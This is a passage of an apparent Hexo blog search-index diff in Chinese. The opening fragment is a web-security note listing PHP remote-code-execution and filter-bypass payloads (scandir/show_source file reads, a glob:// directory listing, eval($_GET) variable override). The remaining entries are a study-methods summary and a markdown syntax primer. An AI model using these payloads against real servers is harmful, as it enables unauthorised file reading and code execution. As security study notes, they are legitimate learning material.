重命名eval(var_dump(scandir(&#39;/&#39;););//读取根目录cat `ls`//等效于打开ls目录下的文件_被过滤可用&#39;[&#39;代替分号过滤使用?&gt;闭合show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><pre><code class="php">//glob伪协议读文件(适用于ls被限制):$a=&#39;glob:///*&#39;;$b=opendir($a);if($b)&#123;    while(($file=readdir($b))!==false)&#123;        echo $file;    &#125;    closedir($b);&#125;exit();</code></pre><pre><code class="php">变量覆盖:?rce=eval($_GET[1]);&amp;1=phpinfo();</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> RCE </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>学习方法</title>
+      <link href="/2023/10/23/learn/"/>
+      <url>/2023/10/23/learn/</url>
+      
+        <content type="html"><![CDATA[<h1 id="学习方法摘录"><a href="#学习方法摘录" class="headerlink" title="学习方法摘录"></a>学习方法摘录</h1><blockquote><p>摘自魏书生先生著作《好学生，好学法》并基于本人自身理解进行部分修改,与原著并不完全相同.（感谢闻校借我这本书让我能了解这些）</p></blockquote><span id="more"></span> <ol><li><strong>明确目的:</strong> 享受学习,定小目标一步步超越.</li><li><strong>激发兴趣:</strong> 先学喜欢的科目,满怀兴趣对待学习.</li><li><strong>磨练意志</strong>: 利用潜意识,坚信自己有巨大潜能,勤奋刻苦,持之以恒.</li><li><strong>发展思维,培养注意力</strong>: 培养思维的独立性,深刻性,逻辑性,灵活性,使思维敏捷。<br> <em><strong>培养创造性思维:</strong></em><ul><li>入迷</li><li>求异</li><li>发散</li><li>独创<br> <em><strong>培养注意力:</strong></em><br> 学会”闹中求静”<br> <em><strong>培养好的注意力的要点:</strong></em></li><li>明确学习目的,增强责任感</li><li>理解事情的结果与意义</li><li>培养广泛的兴趣</li><li>用意志力保持注意力集中</li><li>防止过度疲劳</li><li>培养长期注意<br> 明确学习任务,使注意力集中于一件事,缩小学习范围,明确学习目标.<br> 注意力要素&#x3D;集中+稳定. 要合理转移与分配注意力.</li></ul></li><li><strong>训练记忆力:</strong>  一分钟记忆力比赛,重要内容最初或最后记.<br> <strong>链式记忆法:</strong> 记一五步,看清,熟读,释义,书写,再现.<em>(记一接记二,记二复习一,记三复习二三,记四复习三四,记五复习四五,然后复习一五,最后全部复习一遍).</em><br> 分段记忆,重复记忆,走路时利用零散时间记忆.  </li><li><strong>统筹计划:</strong> 指定大计划小计划双休日学习计划,定个高效学习日,最佳时间多安排任务,控制 <strong>“三闲”</strong> (闲话,闲事,闲思),巧用零散时间,挤时间,别犹豫.</li><li><strong>科学预习,专心听课,及时巩固:</strong> 要进行预习,玩命自学,筛选信息,循序渐进,打好基础,上课听要点,要有所听有所不听,课后还要进行总结.</li><li><strong>认真复习:</strong> 制订复习计划,温故知新,定期复习,复习要扬长补短.<br> <strong>高效复习法:</strong> 围绕中心,及时复习,生化只是,查缺补漏,先回忆,后查找.增强复习效果,看参考书,适当拓展知识面，整理笔记，使知识条理化系统化,补充提示,综合归纳,梳理知识.<br> <strong>复习应注意的问题:</strong> 掌握好复习时机,复习安排要合理,课后复习省于分散,经常复习,以记忆为主的内容应多次重复强化记忆分散复习,阶段性复习应集中时间,个人钻研为主,相互讨论为辅,复习方式要多样化.<br> <em><strong>四化学习法:</strong></em> 消化,简化,序化,系统化<br> <em><strong>高三三步复习法:</strong></em> 一:系统复习,抓基础,吃教材。二:查缺补漏,针对薄弱环节抓。三:最后回顾,置通,巩固和运用知识自己测<br> <em>注意:</em> 与教师辅导相结合,从自身出发.<br> <em>面临考试,心情紧张,怎样复习效率高:</em> 把教材整个体系印在脑中,先看着知识框架,接着记忆重要项目,要由近及远,先复习后学的知识.<br> <em><strong>锥形复习法:集中一点,登峰造极</strong></em><br> <em><strong>趁热打铁法:经常复习,及时复习</strong></em><br> <em><strong>旧路新走:逆思顺读,顺逆交错思考</strong></em>  </li><li><strong>从容考试:</strong> 有效利用考前半个月时间:吃课本,筑基,细啄解题思路,做多套综合性模拟题并总结知识点,分析错题,考前调整心态,考前独来独往好,考前不宜熬夜,考时应放手一搏.<br> 考场闭目养神,冥想,调整呼吸,进行考场放松.<br> 若打不完题应挑空白题答要点,能拿多少是多少,宁可少拿不能不拿,要留出一点复查时间.<br> <strong>考场开拓思路:</strong> (1) 相似思考, (2) 相反思考, (3) 对比思考, (4) 溯源思考, (5) 多路思考, (6) 换元思考, (7) 分解思考.</li></ol><hr>]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Welcome to my blog!!!!!</title>
+      <link href="/2023/09/17/welcome/"/>
+      <url>/2023/09/17/welcome/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><ol><li><a href="#%E6%AC%A2%E8%BF%8E%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84blog%E8%BF%99%E9%87%8C%E4%BC%9A%E4%B8%8D%E6%97%B6%E6%9B%B4%E6%96%B0">欢迎访问我的blog,这里会不时更新</a><ol><li><a href="#markdown%E6%96%87%E4%BB%B6%E6%8C%87%E4%BB%A4">markdown文件指令</a></li></ol></li></ol><h2 id="欢迎访问我的blog-这里会不时更新"><a href="#欢迎访问我的blog-这里会不时更新" class="headerlink" title="欢迎访问我的blog,这里会不时更新"></a>欢迎访问我的blog,这里会不时更新</h2><span id="more"></span><h3 id="markdown文件指令"><a href="#markdown文件指令" class="headerlink" title="markdown文件指令"></a>markdown文件指令</h3><p>这是我的<strong>第一篇</strong>文章,而我并不知道要写什么好,所以我决定将<strong>markdown</strong>文件的各种<strong>指令</strong>写下来,方便自己以后查阅.</p><pre><code>不同的#数量代表不同的标题等级  Ctrl + Shift + H* 斜体** 加粗*** 加粗和斜体加粗，Ctrl + B ；斜体，Ctrl +I如下所示</code></pre><p><em>斜体</em><br><strong>加粗</strong><br><em><strong>加粗和斜体</strong></em></p><pre><code>用反引号``表示命令  Ctrl + Shift + K用 - 管理无序条目，短杠左右需空格，用 1. 管理有序条目，点后需空格，序号依次类推无序，Ctrl + Shift + U；有序，Ctrl + Shift + O引用文本 &gt; 后面直接加文字  Ctrl + Shift + Q超链接: [name](url)  Ctrl + Shift + L附图: ![name](url)  Ctrl + Shift + G分割线----，用在各一级标题后面，使排版更美观、有层次感利用缩进，可以将不同层级的无序条目要点更美观的展现出来</code></pre><p><code>- [ ] 文本</code>  这样会产生一个任务栏,如图  </p><ul><li><input disabled="" type="checkbox"> 文本<br>在其中加入x也就是艾克斯便会填充上,如图</li><li><input checked="" disabled="" type="checkbox"> 文本</li></ul><p>|||表示表格,例:  </p><table><thead><tr><th align="left">表格</th><th align="center">表格</th><th align="right">表格</th></tr></thead><tbody><tr><td align="left">实例1</td><td align="center">aaa</td><td align="right">bbb</td></tr><tr><td align="left">实例2</td><td align="center">ccc</td><td align="right">ddd</td></tr></tbody></table><pre><code>| 表格 | 表格 | 表格|| :--- | :---: |---:|| 实例1 | aaa | bbb || 实例2 | ccc | ddd |</code></pre><p>还可以在markdown文件中直接输入emoji😄😅😋🤡🤤</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
